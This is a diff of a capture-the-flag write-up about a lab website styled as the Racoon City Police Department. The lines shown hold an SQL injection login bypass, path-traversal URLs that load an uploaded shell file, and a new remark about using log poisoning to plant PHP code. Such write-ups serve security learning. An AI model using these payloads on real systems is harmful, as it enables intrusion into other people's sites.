@@ -4,8 +4,6 @@ The website is the Racoon City Police Department's website.
 
 ![](screenshots/1.png)
 
-The challenge description suggests making a `tea` somehow.
-
 # Login
 
 There is an SQL injection on the login page. Using the standard `' OR 1=1 --` in the username and password instantly let us in.
@@ -49,6 +47,8 @@ http://10.10.1.11:65304/pages/gallery.php?file=../cases/shell.txt"
 http://10.10.1.11:65304/pages/gallery.php?file=../../cases/shell.txt"
 http://10.10.1.11:65304/pages/gallery.php?file=../../../cases/shell.txt"
 ```
+
+Alternatively to the upload directory, log poisoning or the session file can be abused to store php code.
 
 ![](screenshots/5.png)
 
